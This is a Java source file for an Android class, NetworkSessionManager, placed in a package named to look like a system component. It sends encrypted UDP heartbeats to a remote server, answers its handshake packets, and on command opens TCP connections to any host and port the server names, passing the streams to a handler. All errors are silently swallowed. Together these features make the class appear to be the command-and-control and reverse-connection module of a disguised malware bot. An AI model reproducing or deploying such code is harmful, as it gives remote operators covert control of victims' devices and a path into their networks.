package com.android.system;

import com.android.system.utils.Crypt;
import com.android.system.utils.DataPack;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Timer;
import java.util.TimerTask;

public class NetworkSessionManager {
    private Object mHeartBeatDataLock = new Object();
    private static final byte[] defaultHeartBeatData = new byte[0];
    private final SessionHandler mSessionHandler;
    private byte[] HeartBeatData = null;
    private int HeartBeatDelay = 2000;
    private int localPort = 0;
    private int Port = 8000;
    private static short SIGNATURE = -13570; //0XCAFE
    private static short OPERATION_SYN = -1;
    private static short OPERATION_ACK = -2;
    private static short OPERATION_HEARTBEAT = 0;
    private static short OPERATION_CONNECT_HOST = 1;
    private static short OPERATION_LISTEN_HOST = 2;
    private static short OPERATION_ACCEPT_HOST = 3;
    private String Host = "";
    private DatagramSocket datagramSocket = null;
    Thread mThread = null;
    Runnable mSessionRunner = new Runnable() {
        @Override
        public void run() {
            try {
                datagramSocket = new DatagramSocket(getLocalPort());
                final DatagramSocket ds = datagramSocket;

                final Timer timer = new Timer();
                timer.schedule(new TimerTask() {

                    @Override
                    public void run() {
                        if(!isStart()) {
                            timer.cancel();
                            return;
                        }
                        //send udp heart beat
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
                        try {
                            dataOutputStream.writeShort(SIGNATURE);
                            dataOutputStream.writeShort(OPERATION_HEARTBEAT);
                            dataOutputStream.write(Crypt.encrypt(getHeartBeatData()));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        byte[] sendData = byteArrayOutputStream.toByteArray();
                        try {
                            ds.send(new DatagramPacket(sendData, sendData.length, InetAddress.getByName(getHost()), getPort()));
                        } catch (UnknownHostException e) {
                        } catch (IOException e) {
                        } catch (Exception e) {
                        } finally {
                            if(!isStart()) {
                                timer.cancel();
                            }
                        }
                    }
                }, 0, HeartBeatDelay);

                //receive udp package
                byte[] receiveData = new byte[0X2000];
                while(isStart()) {
                    DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
                    try {
                        ds.receive(receivePacket);
                        receiveDatagramPackageHandler(receivePacket);
                    } catch (IOException e) {
                    }
                }
            } catch (SocketException e) {
            } catch (Exception e) {
            }
        }
    };

    private boolean startStatus = false;

    public interface SessionHandler {
        void handleSession(InputStream inputStream, OutputStream outputStream);
    }

    public byte[] getHeartBeatData() {
        byte[] data;
        synchronized (mHeartBeatDataLock) {
            if(HeartBeatData == null) {
                data = defaultHeartBeatData;
            }
            data = HeartBeatData;
        }
        return data;
    }

    public void setHeartBeatData(byte[] heartBeatData) {
        synchronized (mHeartBeatDataLock) {
            HeartBeatData = heartBeatData;
        }
    }

    public boolean isStart() {
        return startStatus;
    }

    public int getLocalPort() {
        return localPort;
    }

    public void setLocalPort(int localPort) {
        this.localPort = localPort;
    }

    public int getPort() {
        return Port;
    }

    public void setPort(int port) {
        Port = port;
    }

    public String getHost() {
        return Host;
    }

    public void setHost(String host) {
        Host = host;
    }

    public NetworkSessionManager(SessionHandler handler) {
        mSessionHandler = handler;
    }

    public void start() {
        if(isStart()) {
            return;
        }
        startStatus = true;
        mThread = new Thread(mSessionRunner);
        mThread.start();
    }

    public void stop() {
        if(datagramSocket!= null) {
            datagramSocket.close();
            datagramSocket = null;
        }
        if(mThread != null) {
            try {
                startStatus = false;
                mThread.join();
                mThread = null;
            } catch (InterruptedException e) {
            }
        }
    }

    private void receiveDatagramPackageHandler(DatagramPacket receivePacket) throws IOException {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(receivePacket.getData());
        DataInputStream dataInputStream = new DataInputStream(byteArrayInputStream);
        //read packet head
        if ( dataInputStream.readShort() != SIGNATURE ) {
            return;
        }
        short operation = dataInputStream.readShort();

        //read packet body
        int headLength = 2 + 2;
        String msg = new String(receivePacket.getData(), receivePacket.getOffset() + headLength, receivePacket.getLength()-headLength);
        String[] msgs = msg.split(" ");
        String uuid = msgs[0];
        String packetAddress = receivePacket.getAddress().getHostAddress();
        int packetPort = receivePacket.getPort();
        if(operation == OPERATION_SYN) {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
            dataOutputStream.writeShort(SIGNATURE);
            dataOutputStream.writeShort(OPERATION_ACK);
            dataOutputStream.writeBytes(uuid);
            byte[] ackData = byteArrayOutputStream.toByteArray();
            datagramSocket.send(new DatagramPacket(ackData, ackData.length, receivePacket.getAddress(), receivePacket.getPort()));
        } else if(operation == OPERATION_CONNECT_HOST) {
            if (msgs.length > 1) {
                String[] host_port = msgs[1].split(":");
                packetAddress = host_port[0];
                if (host_port.length > 1) {
                    try {
                        packetPort = Integer.parseInt(host_port[1]);
                    } catch (Exception e) {
                    }
                }
            }
            createTcpInstance(packetAddress, packetPort, uuid);
        }
    }

    private void createTcpInstance(final String host, final int port, final String uuid) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Socket connectSocket = null;
                InputStream inputStream = null;
                OutputStream outputStream = null;
                try {
                    //connect host
                    connectSocket = new Socket(host,port);
                    inputStream = connectSocket.getInputStream();
                    outputStream = connectSocket.getOutputStream();

                    //send uuid
                    DataPack.sendDataPack(outputStream, uuid.getBytes("UTF-8"));

                    //handle by SessionHandler
                    if(mSessionHandler != null){
                        mSessionHandler.handleSession(inputStream,outputStream);
                    }
                } catch (IOException e) {
                } finally {
                    //clean
                    if(connectSocket != null) {
                        try {
                            connectSocket.close();
                        } catch (IOException e) {
                        }
                        connectSocket = null;
                    }
                    if(inputStream != null) {
                        try {
                            inputStream.close();
                        } catch (IOException e) {
                        }
                        inputStream = null;
                    }
                    if(outputStream != null) {
                        try {
                            outputStream.close();
                        } catch (IOException e) {
                        }
                        outputStream = null;
                    }
                }
            }
        }).start();
    }
}
